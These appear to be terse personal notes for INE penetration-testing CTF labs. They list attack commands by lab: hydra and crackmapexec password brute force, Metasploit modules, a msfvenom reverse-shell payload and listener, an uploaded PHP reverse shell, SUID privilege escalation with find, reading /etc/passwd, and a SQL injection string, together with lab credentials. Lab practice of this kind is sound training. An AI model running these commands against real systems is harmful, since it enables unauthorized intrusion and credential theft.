#### Assessment Methodologies: Information Gathering CTF 1
whatweb, nmap, httrack
```
wpscan --url target.ine.local  
```

#### Assessment Methodologies: Footprinting and Scanning CTF 1
```
mysqlshow -h target.ine.local  -P3306 -u db_admin --password  
```

#### Assessment Methodologies: Enumeration CTF 1
Find share using wordlist. Wild guess, first try.
```
smb_login
smbclient  \\\\target.ine.local\\josh -U josh   

portscan/tcp
ftp/ftp_version
ftp/ftp_login

ftp ftp://alice:pretty@target.ine.local:5554

ssh a@target.ine.local 22      
``` 

#### Assessment Methodologies: Vulnerability Assessment CTF 1
EZ?
#### Host & Network Penetration Testing: System-Host Based Attacks CTF 1
Ez

#### Host & Network Penetration Testing: System-Host Based Attacks CTF 2
Ez?

#### Network
Search in strings in wireshark

#### Host & Network Penetration Testing: The Metasploit Framework CTF 1
Use `exploit/windows/mssql/mssql_clr_payload`
Change the payload to `windows/x64/meterpreter/reverse_tcp`
`search -f *flag* -r`

#### Host & Network Penetration Testing: The Metasploit Framework CTF 2
```
rsync <target-ip>::
rsync -av 192.120.27.3::backupwscohen tester
search roxy_wi

```


## Exploitation 1
```
searchsploit flatcore
ls /

ls -l /home
hydra -l iamaweakuser -P /usr/share/wordlists/metasploit/unix_passwords.txt target1.ine.local ssh

search wordpress_scanner
search scanner/http/wp_duplicator_file_read
set FILEPATH /etc/passwd
set FILEPATH /flag3.txt

ssh iamacrazyfreeuser@target2.ine.local
```

## Exploitation 2
```
crackmapexec smb target.ine.local -u tom -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
smbmap -H target.ine.local -u tom -p felipe
smbclient //target.ine.local/HRDocuments -U tom
get flag

get leaked_hashes.txt
search smb_login
set CreateSession true

ftp target.ine.local 21
david:omnitrix_9901

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.44.2 LPORT=1234 -f aspx > shell.aspx
use multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.49.3
set LPORT 1234

```

## Exploitation 3
```
search proftpd
set SITEPATH /var/www/html

netstat
nc 127.0.0.1 8888

enum4linux -a target2.ine.local
crackmapexec smb target2.ine.local -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
cp /usr/share/webshells/php/php-reverse-shell.php .
nano (use 192.129.237.2)
put php-reverse-shell.php
nc -nvlp 1234
> go to shell in browser

cat /etc/shells | while read shell; do ls -l $shell 2>/dev/null; done
find / -perm -4000 2>/dev/null
find / -exec /bin/rbash -p \; -quit
```
https://gtfobins.github.io/gtfobins/find/

## Post-Exploitation 1
```
cat /etc/passwd
cat /etc/group
ls -al /etc/cron*
cat /etc/hosts

cd /home/user
john:Pass@john123

ssh john@target2.ine.local
> Linux Privilege Escalation - Weak Permissions
```

## Post-Exploitation 2
```
hydra -l alice -P /usr/share/wordlists/metasploit/unix_passwords.txt target.ine.local ssh

john --format=NT hashes.txt

scp PrintSpoofer64.exe david@target.ine.local:"C:\\Users\\david\\"
PrintSpoofer64.exe -i -c cmd

icacls flag
icacls flag /remove:d "NT AUTHORITY\SYSTEM"
```

## Web Application Penetration Testing CTF 1
```
/usr/share/wordlists/dirb/common.txt 
/usr/share/seclists/Usernames/top-usernames-shortlist.txt 
/root/Desktop/wordlists/100-common-passwords.txt

dirb http://target.ine.local 
gobuster dir --url http://target.ine.local --wordlist /usr/share/wordlists/dirb/common.txt    

hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /root/Desktop/wordlists/100-common-passwords.txt target.ine.local http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid username or password"

' OR 1=1; -- -
```


# Random
HTTPFileServer: Rejetto
Samba: pipe_is_known, is_known_pipename, enum4linux
BadBlue 2.72: badblue_passthru
ProFTPD 1.3.3: Backdoor command execution
proxychains for pivoting, ping_sweep?
### Phishing
GoPhish.

